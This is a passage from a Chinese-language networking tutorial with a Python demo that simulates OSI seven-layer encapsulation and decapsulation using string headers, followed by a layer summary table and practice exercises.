class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day03_osi_demo.py</span><br><span class="hljs-comment"># 功能：演示OSI七层模型的数据封装和解封装过程</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OSILayer</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;OSI模型的基础层类&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, layer_num</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.layer_num = layer_num<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;封装数据：添加本层头部&quot;&quot;&quot;</span><br>        header = <span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;self.name&#125;</span>头部]&quot;</span><br>        <span class="hljs-keyword">return</span> header + data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;解封装数据：移除本层头部&quot;&quot;&quot;</span><br>        header = <span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;self.name&#125;</span>头部]&quot;</span><br>        <span class="hljs-keyword">if</span> data.startswith(header):<br>            <span class="hljs-keyword">return</span> data[<span class="hljs-built_in">len</span>(header):]<br>        <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PhysicalLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;物理层：第1层&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;物理层&quot;</span>, <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;将数据转换为比特流&quot;&quot;&quot;</span><br>        bits = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(c), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📡 <span class="hljs-subst">&#123;self.name&#125;</span>: 将数据转换为比特流&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   比特流(前64位): <span class="hljs-subst">&#123;bits[:<span class="hljs-number">64</span>]&#125;</span>...&quot;</span>)<br>        <span class="hljs-keyword">return</span> bits<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, bits</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;将比特流转换为数据&quot;&quot;&quot;</span><br>        chars = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bits), <span class="hljs-number">8</span>):<br>            byte = bits[i:i+<span class="hljs-number">8</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(byte) == <span class="hljs-number">8</span>:<br>                chars.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>)))<br>        data = <span class="hljs-string">&#x27;&#x27;</span>.join(chars)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📡 <span class="hljs-subst">&#123;self.name&#125;</span>: 将比特流转换为数据&quot;</span>)<br>        <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataLinkLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;数据链路层：第2层&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;数据链路层&quot;</span>, <span class="hljs-number">2</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;添加MAC地址（帧头和帧尾）&quot;&quot;&quot;</span><br>        mac_src = <span class="hljs-string">&quot;AA:BB:CC:DD:EE:FF&quot;</span>  <span class="hljs-comment"># 源MAC地址</span><br>        mac_dst = <span class="hljs-string">&quot;11:22:33:44:55:66&quot;</span>  <span class="hljs-comment"># 目标MAC地址</span><br>        frame = <span class="hljs-string">f&quot;[帧头|源MAC:<span class="hljs-subst">&#123;mac_src&#125;</span>|目标MAC:<span class="hljs-subst">&#123;mac_dst&#125;</span>]<span class="hljs-subst">&#123;data&#125;</span>[帧尾|CRC校验]&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🔗 <span class="hljs-subst">&#123;self.name&#125;</span>: 添加MAC地址&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   源MAC: <span class="hljs-subst">&#123;mac_src&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   目标MAC: <span class="hljs-subst">&#123;mac_dst&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> frame<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, frame</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;移除MAC地址&quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 简化处理：移除帧头和帧尾</span><br>        start = frame.find(<span class="hljs-string">&quot;]&quot;</span>) + <span class="hljs-number">1</span><br>        end = frame.rfind(<span class="hljs-string">&quot;[&quot;</span>)<br>        data = frame[start:end]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🔗 <span class="hljs-subst">&#123;self.name&#125;</span>: 移除MAC地址&quot;</span>)<br>        <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;网络层：第3层&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;网络层&quot;</span>, <span class="hljs-number">3</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;添加IP地址&quot;&quot;&quot;</span><br>        ip_src = <span class="hljs-string">&quot;192.168.1.100&quot;</span>  <span class="hljs-comment"># 源IP地址</span><br>        ip_dst = <span class="hljs-string">&quot;93.184.216.34&quot;</span>  <span class="hljs-comment"># 目标IP地址（example.com）</span><br>        packet = <span class="hljs-string">f&quot;[IP头|源IP:<span class="hljs-subst">&#123;ip_src&#125;</span>|目标IP:<span class="hljs-subst">&#123;ip_dst&#125;</span>|TTL:64]<span class="hljs-subst">&#123;data&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🌐 <span class="hljs-subst">&#123;self.name&#125;</span>: 添加IP地址&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   源IP: <span class="hljs-subst">&#123;ip_src&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   目标IP: <span class="hljs-subst">&#123;ip_dst&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> packet<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, packet</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;移除IP头部&quot;&quot;&quot;</span><br>        start = packet.find(<span class="hljs-string">&quot;]&quot;</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🌐 <span class="hljs-subst">&#123;self.name&#125;</span>: 移除IP头部&quot;</span>)<br>        <span class="hljs-keyword">return</span> start <span class="hljs-keyword">and</span> packet[start:] <span class="hljs-keyword">or</span> packet<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TransportLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;传输层：第4层&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;传输层&quot;</span>, <span class="hljs-number">4</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;添加端口号（TCP头部）&quot;&quot;&quot;</span><br>        port_src = <span class="hljs-number">54321</span>  <span class="hljs-comment"># 源端口</span><br>        port_dst = <span class="hljs-number">80</span>     <span class="hljs-comment"># 目标端口（HTTP）</span><br>        segment = <span class="hljs-string">f&quot;[TCP头|源端口:<span class="hljs-subst">&#123;port_src&#125;</span>|目标端口:<span class="hljs-subst">&#123;port_dst&#125;</span>|序号:12345]<span class="hljs-subst">&#123;data&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🚚 <span class="hljs-subst">&#123;self.name&#125;</span>: 添加端口号（TCP协议）&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   源端口: <span class="hljs-subst">&#123;port_src&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   目标端口: <span class="hljs-subst">&#123;port_dst&#125;</span> (HTTP)&quot;</span>)<br>        <span class="hljs-keyword">return</span> segment<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, segment</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;移除TCP头部&quot;&quot;&quot;</span><br>        start = segment.find(<span class="hljs-string">&quot;]&quot;</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🚚 <span class="hljs-subst">&#123;self.name&#125;</span>: 移除TCP头部&quot;</span>)<br>        <span class="hljs-keyword">return</span> segment[start:]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;会话层：第5层&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;会话层&quot;</span>, <span class="hljs-number">5</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;建立会话&quot;&quot;&quot;</span><br>        session_id = <span class="hljs-string">&quot;SESSION-20250105-12345&quot;</span><br>        session_data = <span class="hljs-string">f&quot;[会话头|会话ID:<span class="hljs-subst">&#123;session_id&#125;</span>]<span class="hljs-subst">&#123;data&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;💬 <span class="hljs-subst">&#123;self.name&#125;</span>: 建立会话&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   会话ID: <span class="hljs-subst">&#123;session_id&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> session_data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;终止会话&quot;&quot;&quot;</span><br>        start = data.find(<span class="hljs-string">&quot;]&quot;</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;💬 <span class="hljs-subst">&#123;self.name&#125;</span>: 解析会话信息&quot;</span>)<br>        <span class="hljs-keyword">return</span> data[start:]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PresentationLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;表示层：第6层&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;表示层&quot;</span>, <span class="hljs-number">6</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;数据格式转换&quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 这里简化为添加编码信息</span><br>        formatted_data = <span class="hljs-string">f&quot;[格式|编码:UTF-8|压缩:无|加密:无]<span class="hljs-subst">&#123;data&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🎨 <span class="hljs-subst">&#123;self.name&#125;</span>: 数据格式处理&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   编码: UTF-8&quot;</span>)<br>        <span class="hljs-keyword">return</span> formatted_data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;数据格式还原&quot;&quot;&quot;</span><br>        start = data.find(<span class="hljs-string">&quot;]&quot;</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🎨 <span class="hljs-subst">&#123;self.name&#125;</span>: 数据格式还原&quot;</span>)<br>        <span class="hljs-keyword">return</span> data[start:]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;应用层：第7层&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;应用层&quot;</span>, <span class="hljs-number">7</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;生成HTTP请求&quot;&quot;&quot;</span><br>        http_request = <span class="hljs-string">f&quot;GET / HTTP/1.1\\nHost: example.com\\n\\n<span class="hljs-subst">&#123;data&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📱 <span class="hljs-subst">&#123;self.name&#125;</span>: 生成HTTP请求&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   请求: GET / HTTP/1.1&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   主机: example.com&quot;</span>)<br>        <span class="hljs-keyword">return</span> http_request<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;解析HTTP响应&quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📱 <span class="hljs-subst">&#123;self.name&#125;</span>: 解析HTTP响应&quot;</span>)<br>        <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OSIModel</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;OSI七层模型&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 创建各层对象</span><br>        <span class="hljs-variable language_">self</span>.layers = [<br>            ApplicationLayer(),    <span class="hljs-comment"># 第7层</span><br>            PresentationLayer(),   <span class="hljs-comment"># 第6层</span><br>            SessionLayer(),        <span class="hljs-comment"># 第5层</span><br>            TransportLayer(),      <span class="hljs-comment"># 第4层</span><br>            NetworkLayer(),        <span class="hljs-comment"># 第3层</span><br>            DataLinkLayer(),       <span class="hljs-comment"># 第2层</span><br>            PhysicalLayer(),       <span class="hljs-comment"># 第1层</span><br>        ]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_data</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;发送数据：从应用层到物理层&quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;📤 数据发送过程（封装）&quot;</span>.center(<span class="hljs-number">70</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n原始数据: <span class="hljs-subst">&#123;data&#125;</span>\n&quot;</span>)<br><br>        current_data = data<br><br>        <span class="hljs-comment"># 从应用层到物理层，逐层封装</span><br>        <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.layers:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;▼&#x27;</span> * <span class="hljs-number">35</span>&#125;</span>&quot;</span>)<br>            current_data = layer.encapsulate(current_data)<br>            <span class="hljs-keyword">if</span> layer.layer_num &gt; <span class="hljs-number">1</span>:  <span class="hljs-comment"># 物理层的输出太长，不显示完整数据</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   数据长度: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(current_data)&#125;</span> 字符&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-keyword">return</span> current_data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_data</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;接收数据：从物理层到应用层&quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;📥 数据接收过程（解封装）&quot;</span>.center(<span class="hljs-number">70</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>        current_data = data<br><br>        <span class="hljs-comment"># 从物理层到应用层，逐层解封装</span><br>        <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-variable language_">self</span>.layers):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;▲&#x27;</span> * <span class="hljs-number">35</span>&#125;</span>&quot;</span>)<br>            current_data = layer.decapsulate(current_data)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n最终数据: <span class="hljs-subst">&#123;current_data&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>        <span class="hljs-keyword">return</span> current_data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;主函数&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OSI七层模型数据封装演示&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n📚 本程序演示OSI七层模型的数据封装和解封装过程&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 创建OSI模型</span><br>    osi = OSIModel()<br><br>    <span class="hljs-comment"># 要发送的数据</span><br>    original_data = <span class="hljs-string">&quot;Hello, Network World!&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🎯 准备发送数据: \&quot;<span class="hljs-subst">&#123;original_data&#125;</span>\&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 发送数据（封装过程）</span><br>    transmitted_data = osi.send_data(original_data)<br><br>    <span class="hljs-comment"># 模拟数据传输</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;⚡&quot;</span> * <span class="hljs-number">35</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   数据通过网络传输中...&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;⚡&quot;</span> * <span class="hljs-number">35</span>)<br><br>    <span class="hljs-comment"># 接收数据（解封装过程）</span><br>    received_data = osi.receive_data(transmitted_data)<br><br>    <span class="hljs-comment"># 验证</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;✅ 传输完成！&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n发送的数据: <span class="hljs-subst">&#123;original_data&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;接收的数据: <span class="hljs-subst">&#123;received_data&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello, Network World!&quot;</span> <span class="hljs-keyword">in</span> received_data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n🎉 数据传输成功！&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n❌ 数据传输失败！&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="运行程序">运行程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> code/day03<br>python day03_osi_demo.py<br></code></pre></td></tr></table></figure><h3 id="预期输出">预期输出</h3><p>程序会详细展示数据在OSI七层模型中的封装和解封装过程，帮助你直观理解每一层的作用。</p><h2 id="🎓-知识小结">🎓 知识小结</h2><h3 id="今天学到了什么？">今天学到了什么？</h3><ol><li>✅ OSI七层模型是网络通信的标准模型</li><li>✅ 每一层都有明确的职责</li><li>✅ 数据发送时逐层封装，接收时逐层解封装</li><li>✅ 分层的优点是降低复杂度、便于维护</li></ol><h3 id="OSI七层速记">OSI七层速记</h3><table><thead><tr><th>层次</th><th>名称</th><th>关键词</th><th>协议示例</th></tr></thead><tbody><tr><td>7</td><td>应用层</td><td>用户接口</td><td>HTTP、FTP、DNS</td></tr><tr><td>6</td><td>表示层</td><td>格式转换</td><td>SSL、JPEG</td></tr><tr><td>5</td><td>会话层</td><td>会话管理</td><td>RPC、SQL</td></tr><tr><td>4</td><td>传输层</td><td>端到端</td><td>TCP、UDP</td></tr><tr><td>3</td><td>网络层</td><td>路由寻址</td><td>IP、ICMP</td></tr><tr><td>2</td><td>数据链路层</td><td>帧传输</td><td>Ethernet、WiFi</td></tr><tr><td>1</td><td>物理层</td><td>比特流</td><td>网线、光纤</td></tr></tbody></table><h3 id="重要概念">重要概念</h3><ul><li><strong>封装</strong>（Encapsulation）：发送数据时，逐层添加头部信息</li><li><strong>解封装</strong>（Decapsulation）：接收数据时，逐层移除头部信息</li><li><strong>PDU</strong>（Protocol Data Unit）：协议数据单元<ul><li>应用层：消息（Message）</li><li>传输层：段（Segment）</li><li>网络层：包（Packet）</li><li>数据链路层：帧（Frame）</li><li>物理层：比特（Bit）</li></ul></li></ul><h2 id="💪-练习题">💪 练习题</h2><h3 id="练习1：层次识别">练习1：层次识别</h3><p>以下操作分别在哪一层完成？</p><ol><li>输入网址 <a href="http://www.baidu.com">www.baidu.com</a></li><li>将域名解析为IP地址</li><li>添加源端口和目标端口</li><li>选择路由路径</li><li>将数据转换为电信号</li></ol><h3 id="练习2：绘制封装过程">练习2：绘制封装过程</h3><p>画出&quot;发送一封邮件&quot;的完整封装过程，标注每一层添加的信息。</p><h3 id="练习3：思考题">练习3：思考题</h3><ol><li>为什么要分成7层？能不能只分3层或分10层？</li><li>如果没有分层，会有什么问题？</li><li>哪些层是软件实现的？哪些是硬件实现的？</li></ol><h3 